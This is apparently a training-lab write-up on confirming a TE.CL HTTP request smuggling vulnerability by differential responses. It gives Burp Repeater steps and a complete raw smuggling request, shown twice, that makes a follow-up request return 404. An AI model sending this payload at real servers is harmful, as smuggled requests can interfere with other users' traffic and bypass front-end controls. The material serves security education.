## HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

**Category:** request_smuggling
**Difficulty:** Unknown

### Description
This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.

### Solution Steps
In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
Using Burp Repeater, issue the following request twice:
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
The second request should receive an HTTP 404 response.

### Key Payloads
- `POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: request_smuggling
